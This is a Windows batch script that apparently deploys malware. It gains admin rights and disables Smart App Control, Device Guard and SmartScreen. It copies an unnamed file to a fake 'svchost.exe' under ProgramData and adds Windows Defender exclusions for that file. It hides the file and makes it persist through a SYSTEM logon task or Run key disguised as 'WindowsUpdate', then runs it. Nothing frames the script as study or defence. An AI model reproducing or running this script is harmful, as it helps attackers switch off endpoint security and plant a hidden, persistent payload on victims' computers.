@echo off
setlocal enabledelayedexpansion

REM Run as admin automatically
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

set "TARGET=%ProgramData%\Microsoft\Network\Diagnostics\svchost.exe"

echo Starting deployment...

REM ==================== FIND CUSTOM FILE IN FOLDER ====================
set "SOURCE_FILE=%~dp0custom_name.file"

if not exist "%SOURCE_FILE%" (
    echo ERROR: File not found in folder!
    echo Expected: %SOURCE_FILE%
    pause
    exit /b 1
)

echo Found source file: %SOURCE_FILE%

REM ==================== DISABLE SMART APP CONTROL ====================
echo [1/6] Disabling Smart App Control...

REM Method 1: Registry disable for Smart App Control
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v "SACEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "SACEnabled" /t REG_DWORD /d 0 /f >nul 2>&1

REM Method 2: Disable via Windows Security settings
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\SmartAppControl" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\SmartAppControl" /v "SvcStart" /t REG_DWORD /d 0 /f >nul 2>&1

REM Method 3: Stop Smart App Control service
net stop "SmartAppControlSvc" >nul 2>&1
sc config "SmartAppControlSvc" start= disabled >nul 2>&1

REM ==================== DISABLE DEVICE GUARD/WDAC ====================
echo [2/6] Disabling Device Guard...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
net stop CodeIntegrity >nul 2>&1

REM ==================== DISABLE SMARTScreen ====================
echo [3/6] Disabling SmartScreen...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".exe;.bat;.cmd;.tmp" /f >nul 2>&1

REM ==================== DEPLOY FILES ====================
echo [4/6] Deploying files...
mkdir "%ProgramData%\Microsoft\Network\Diagnostics" 2>nul
copy "%SOURCE_FILE%" "%TARGET%" >nul 2>&1

if not exist "%TARGET%" (
    echo ERROR: Failed to copy file
    pause
    exit /b 1
)

REM ==================== CONFIGURE DEFENDER ====================
echo [5/6] Configuring Windows Defender...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
timeout /t 1 /nobreak >nul
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET%'" 2>nul
powershell -Command "Add-MpPreference -ExclusionPath '%ProgramData%\Microsoft\Network\Diagnostics'" 2>nul
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" 2>nul

attrib +h +s "%TARGET%" >nul 2>&1

REM ==================== PERSISTENCE ====================
echo [6/6] Setting up persistence...
schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "%TARGET%" /RU SYSTEM /F >nul 2>&1
if errorlevel 1 (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%TARGET%" /f >nul 2>&1
)

REM ==================== START SERVICE ====================
echo Starting service...
start "" "%TARGET%"

REM Additional start attempt
timeout /t 2 /nobreak >nul
cmd /c start "" "%TARGET%" >nul 2>&1

echo Done

pause
